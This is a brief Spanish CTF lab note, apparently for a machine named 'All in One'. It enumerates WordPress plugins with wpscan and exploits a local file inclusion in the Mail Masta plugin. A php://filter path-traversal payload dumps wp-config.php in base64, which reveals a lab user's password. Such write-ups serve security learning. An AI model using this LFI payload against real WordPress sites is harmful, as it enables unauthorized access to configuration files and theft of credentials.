Dentro de los wordpress hay un fichero de configuración donde se guardan credenciales de los usuarios registrados; y podemos llegar a él explotando distintas vulnerabilidades, como un LFI detectando primero un plugin vulnerable con wpscan en la máquina [[MAQUINA ALL IN ONE]]
```bash
wpscan --url http://10.10.123.20/wordpress/ -e p
```
Y encontramos este que es vulnerable:
![[Pasted image 20230825163230.png]]
Tenemos un script

```bash
https://wpscan.com/vulnerability/8609
```
![[Pasted image 20230825164108.png]]
Lo probamos en el navegador y funciona:
![[Pasted image 20230825164125.png]]
Pero si queremos obtener el fichero wp-config.php, tenemos que hacer uso de un wrapper:
```bash
http://10.10.6.206/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```
![[Pasted image 20230826170029.png]]
Esto lo tenemos que decodificar ya que viene en base64:
![[Pasted image 20230826170206.png]]
Y vemos las credenciales del usuario elyana:
```bash
elyana:H@ckme@123
```
